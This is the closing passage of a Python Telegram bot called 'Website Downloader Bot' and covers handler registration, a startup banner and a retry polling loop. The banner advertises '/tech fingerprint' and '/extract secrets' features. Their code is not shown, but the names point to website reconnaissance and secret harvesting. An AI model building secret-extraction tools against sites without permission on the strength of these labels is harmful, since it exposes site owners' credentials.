    app.add_handler(CommandHandler("setpages",       cmd_setpages))
    app.add_handler(CommandHandler("setassets",      cmd_setassets))
    # ── Proxy admin commands ──────────────────────────
    # ── File upload handler ──────────────────────────
    app.add_handler(MessageHandler(
        filters.Document.ALL, handle_app_upload
    ))
    # ── Callbacks ─────────────────────────────────────
    app.add_handler(CallbackQueryHandler(force_join_callback,   pattern="^fj_check$"))
    app.add_handler(CallbackQueryHandler(appassets_cat_callback, pattern="^apa_"))
    app.add_handler(CallbackQueryHandler(admin_callback,        pattern="^adm_"))
    # ── Global error handler → Admin notify ──────────
    app.add_error_handler(error_handler)

    print("╔══════════════════════════════════════╗")
    print("║  Website Downloader Bot v17.0        ║")
    print(f"║  SSRF Protection:     ✅             ║")
    print(f"║  Path Traversal:      ✅             ║")
    print(f"║  Rate Limiting:       ✅ ({RATE_LIMIT_SEC}s)     ║")
    print(f"║  Queue System:        ✅ (max {QUEUE_MAX})      ║")
    print(f"║  Admin Error Notify:  ✅             ║")
    print(f"║  Auto-Delete Files:   ✅ ({FILE_EXPIRY_HOURS}h)       ║")
    print(f"║  Admin Cmd Hidden:    ✅             ║")
    print(f"║  File Log:            ✅ bot.log     ║")
    print(f"║  JS (Puppeteer):      {'✅' if PUPPETEER_OK else '❌ npm install puppeteer'}  ║")
    print(f"║  Concurrent:          {MAX_WORKERS} users           ║")
    print(f"║  /tech fingerprint:   ✅             ║")
    print(f"║  /extract secrets:    ✅             ║")
    print(f"║  /monitor alerts:     ✅             ║")
    print("╚══════════════════════════════════════╝")

    # ── Retry loop — Termux network drop ကို handle ──
    MAX_RETRIES = 10
    RETRY_DELAY = 10   # seconds

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            logger.info("Bot starting... (attempt %d/%d)", attempt, MAX_RETRIES)

            async def _start_background(app):
                """Background tasks — queue worker + auto-delete loop + monitor loop"""
                global _monitor_app_ref
                _monitor_app_ref = app
                asyncio.create_task(queue_worker())
                asyncio.create_task(auto_delete_loop())
                asyncio.create_task(monitor_loop())
                logger.info("Background tasks started (queue worker + auto-delete + monitor)")

            app.post_init = _start_background

            app.run_polling(
                allowed_updates = Update.ALL_TYPES,
                drop_pending_updates = True,
                timeout          = 20,
                poll_interval    = 0.5,
            )
            break  # clean exit
        except TimedOut as e:
            logger.warning("TimedOut (attempt %d): %s", attempt, e)
            if attempt < MAX_RETRIES:
                print(f"⚠️  Timeout — {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
                import time as _time; _time.sleep(RETRY_DELAY)
            else:
                print("❌ Max retries ပြည့်ပါပြီ — Network စစ်ပါ")
        except NetworkError as e:
            logger.warning("NetworkError (attempt %d): %s", attempt, e)
            if attempt < MAX_RETRIES:
                print(f"⚠️  Network error — {RETRY_DELAY}s နောက်မှ retry ({attempt}/{MAX_RETRIES})...")
                import time as _time; _time.sleep(RETRY_DELAY)
            else:
                print("❌ Max retries ပြည့်ပါပြီ — Network စစ်ပါ")
        except KeyboardInterrupt:
            print("\n👋 Bot stopped.")
            break

if __name__ == '__main__':
    main()
